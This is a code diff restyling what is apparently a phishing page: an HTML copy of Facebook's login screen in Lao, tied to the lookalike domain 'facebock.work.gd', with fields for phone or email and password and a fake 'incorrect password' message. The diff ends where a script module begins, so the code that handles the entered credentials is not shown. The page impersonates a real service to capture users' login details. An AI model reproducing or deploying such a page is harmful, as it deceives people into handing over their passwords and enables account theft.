@@ -9,174 +9,225 @@
     <meta property="og:url" content="https://facebock.work.gd/" />
     <meta property="og:type" content="website" />
 
-    <title>Facebook - Log In or Sign Up</title>
-    <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: Helvetica, Arial, sans-serif;
-        }
-        html, body {
-            touch-action: manipulation;
-        }
-
-        body {
-            background-color: #f0f2f5;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-        }
-        .container {
-            width: 100%;
-            max-width: 980px;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            padding: 20px;
-        }
-        .logo-section {
-            width: 50%;
-            padding-right: 32px;
-        }
-        .logo-section img {
-            width: 300px;
-            margin-bottom: 10px;
-        }
-        .logo-section h2 {
-            font-size: 28px;
-            font-weight: normal;
-            line-height: 32px;
-            color: #1c1e21;
-        }
-        .form-section {
-            width: 40%;
-        }
-        .form-container {
-            background-color: white;
-            border-radius: 8px;
-            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1), 0 8px 16px rgba(0, 0, 0, 0.1);
-            padding: 20px;
-        }
-        input[type="text"], input[type="password"] {
-            width: 100%;
-            padding: 14px 16px;
-            font-size: 17px;
-            border: 1px solid #dddfe2;
-            border-radius: 6px;
-            margin-bottom: 12px;
-        }
-        .login-btn {
-            background-color: #1877f2;
-            color: white;
-            border: none;
-            border-radius: 6px;
-            font-size: 20px;
-            font-weight: bold;
-            padding: 10px;
-            width: 100%;
-            cursor: pointer;
-            margin-bottom: 16px;
-        }
-        .forgot-password {
-            text-align: center;
-            margin-bottom: 16px;
-        }
-        .forgot-password a {
-            color: #1877f2;
-            font-size: 14px;
-            text-decoration: none;
-        }
-        .divider {
-            border-bottom: 1px solid #dadde1;
-            margin: 20px 0;
-        }
-        .create-account {
-            text-align: center;
-        }
-        .create-btn {
-            background-color: #42b72a;
-            color: white;
-            border: none;
-            border-radius: 6px;
-            font-size: 17px;
-            font-weight: bold;
-            padding: 10px 16px;
-            cursor: pointer;
-            margin: 6px 0;
-        }
-        .create-page {
-            text-align: center;
-            font-size: 14px;
-            margin-top: 28px;
-        }
-        .create-page a {
-            font-weight: bold;
-            color: #1c1e21;
-            text-decoration: none;
-        }
-        .error-message {
-            color: #ff3333;
-            margin-bottom: 15px;
-            font-size: 14px;
-            display: none;
-        }
-        footer {
-            position: absolute;
-            bottom: 0;
-            width: 100%;
-            background-color: white;
-            padding: 20px;
-            text-align: center;
-            font-size: 12px;
-            color: #737373;
-        }
-        @media (max-width: 900px) {
-            .container {
-                flex-direction: column;
+    <!DOCTYPE html>
+    <html lang="en">
+    <head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <title>Facebook - Log In or Sign Up</title>
+        <style>
+            * {
+                margin: 0;
+                padding: 0;
+                box-sizing: border-box;
+                font-family: Helvetica, Arial, sans-serif;
             }
-            .logo-section, .form-section {
+        
+            html, body {
+                touch-action: manipulation;
+                background-color: #f0f2f5;
+                min-height: 100vh;
+                width: 100%;
+            }
+        
+            .container {
+                width: 100%;
+                max-width: 980px;
+                margin: 0 auto;
+                padding: 12px;
+                display: flex;
+                flex-direction: column;
+                align-items: center;
+            }
+        
+            .language-selector {
                 width: 100%;
                 text-align: center;
-                padding-right: 0;
-                margin-bottom: 20px;
-            }
+                margin-bottom: 0px;
+                margin-top: 50px;
+                font-size: 14px;
         }
-    </style>
-</head>
-<body>
-    <div class="container" style="position: fixed; top: 0; left: 50%; transform: translateX(-50%);">
-        <div style="margin-bottom: 20%; margin-top: 10%;">ພາສາລາວ</div>
-        <div class="logo-section">
-            <img src="https://i.postimg.cc/pVJ1g45t/facebook.png" style="height: 18%; width: 18%;">
-        </div>
-        <div class="form-section">
-            <div class="form-container">
-                <div id="error-message" class="error-message">
-                    ອີເມວຫຼືລະຫັດຜ່ານບໍ່ຖືກຕ້ອງ, ກະລຸນາລອງອີກຄັ້ງ
+    
+        
+            .logo-section {
+                width: 100%;
+                text-align: center;
+                margin-bottom: 16px;
+            }
+        
+            .logo-section img {
+                width: 180px;
+                max-width: 18%;
+                margin-bottom: 12%;
+                margin-top: 16%;
+            }
+        
+            .logo-section h2 {
+                font-size: 20px;
+                line-height: 24px;
+                color: #1c1e21;
+                padding: 0 12px;
+                text-align: center;
+            }
+        
+            .form-section {
+                width: 100%;
+                max-width: 400px;
+            }
+        
+            .form-container {
+                background-color: white;
+                border-radius: 8px;
+                box-shadow: 0 2px 4px rgba(0,0,0,0.1), 0 8px 16px rgba(0,0,0,0.1);
+                padding: 16px;
+                margin-bottom: 16px;
+            }
+        
+            input[type="text"], input[type="password"] {
+                width: 100%;
+                padding: 12px 14px;
+                font-size: 16px;
+                border: 1px solid #dddfe2;
+                border-radius: 6px;
+                margin-bottom: 10px;
+            }
+        
+            .login-btn {
+                background-color: #1877f2;
+                color: white;
+                border: none;
+                border-radius: 6px;
+                font-size: 18px;
+                font-weight: bold;
+                padding: 10px;
+                width: 100%;
+                cursor: pointer;
+                margin-bottom: 12px;
+            }
+        
+            .forgot-password {
+                text-align: center;
+                margin-bottom: 14px;
+            }
+        
+            .forgot-password a {
+                color: #1877f2;
+                font-size: 14px;
+                text-decoration: none;
+            }
+        
+            .divider {
+                border-bottom: 1px solid #dadde1;
+                margin: 16px 0;
+            }
+        
+            .create-account {
+                text-align: center;
+            }
+        
+            .create-btn {
+                background-color: #42b72a;
+                color: white;
+                border: none;
+                border-radius: 6px;
+                font-size: 16px;
+                font-weight: bold;
+                padding: 10px 14px;
+                cursor: pointer;
+                margin: 6px 0;
+            }
+        
+            .create-page {
+                text-align: center;
+                font-size: 14px;
+                margin-top: 20px;
+                padding: 0 12px;
+            }
+        
+            .create-page a {
+                font-weight: bold;
+                color: #1c1e21;
+                text-decoration: none;
+            }
+        
+            .error-message {
+                color: #ff3333;
+                margin-bottom: 12px;
+                font-size: 14px;
+                display: none;
+                text-align: center;
+            }
+        
+            footer {
+                text-align: center;
+                font-size: 12px;
+                color: #737373;
+                margin-top: 20px;
+                padding: 10px;
+            }
+    
+            /* Mobile-specific styles */
+            @media (max-width: 480px) {
+                .container {
+                    padding: 10px;
+                }
+                
+                .logo-section img {
+                    width: 150px;
+                }
+                
+                .form-container {
+                    padding: 12px;
+                }
+                
+                input[type="text"], input[type="password"] {
+                    padding: 10px 12px;
+                    font-size: 16px;
+                }
+                
+                .login-btn, .create-btn {
+                    font-size: 16px;
+                    padding: 8px 10px;
+                }
+            }
+        </style>
+    </head>
+    <body>
+        <div class="container">
+            <div class="language-selector">ພາສາລາວ</div>
+    
+            <div class="logo-section">
+                <img src="https://i.postimg.cc/pVJ1g45t/facebook.png" alt="Facebook">
+            </div>
+    
+            <div class="form-section">
+                <div class="form-container">
+                    <div id="error-message" class="error-message">
+                        ອີເມວຫຼືລະຫັດຜ່ານບໍ່ຖືກຕ້ອງ, ກະລຸນາລອງອີກຄັ້ງ
+                    </div>
+                    <form id="login-form">
+                        <input type="text" id="email" placeholder="ເບີໂທລະສັບມືຖື ຫຼື ອີເມວ" required>
+                        <input type="password" id="password" placeholder="ລະຫັດຜ່ານ" required>
+                        <button type="button" id="login-btn" class="login-btn">ເຂົ້າສູ່ລະບົບ</button>
+                        <div class="forgot-password">
+                            <a href="#">ລືມລະຫັດຜ່ານ?</a>
+                        </div>
+                        <div class="divider"></div>
+                        <div class="create-account">
+                            <button type="button" class="create-btn">ສ້າງບັນຊີໃໝ່</button>
+                        </div>
+                    </form>
                 </div>
-                <form id="login-form">
-                    <input type="text" id="email" placeholder="ເບີໂທລະສັບມືຖື ຫຼື ອີເມວ" required>
-                    <input type="password" id="password" placeholder="ລະຫັດຜ່ານ" required>
-                    <button type="button" id="login-btn" class="login-btn">ເຂົ້າສູ່ລະບົບ</button>
-                    <div class="forgot-password">
-                        <a href="#">ລືມລະຫັດຜ່ານ?</a>
-                    </div>
-                    <div class="divider"></div>
-                    <div class="create-account">
-                        <button type="button" class="create-btn">ສ້າງບັນຊີໃໝ່</button>
-                    </div>
-                </form>
-            </div>
-            <div class="create-page">
-                <a href="#">ສ້າງຫນ້າ</a> ສຳລັບຄົນດັງ, ກຸ່ມ, ຫຼື ທຸລະກິດ
+                <div class="create-page">
+                    <a href="#">ສ້າງຫນ້າ</a> ສຳລັບຄົນດັງ, ກຸ່ມ, ຫຼື ທຸລະກິດ
+                </div>
             </div>
         </div>
-    </div>
-    <footer>
-        <div>Facebook © 2025</div>
-    </footer>
+        <footer>
+            Facebook © 2025
+        </footer>
+    </body>
+    </html>
 
     <script type="module">
         // Import เฉพาะ functions ที่จำเป็นต้องใช้
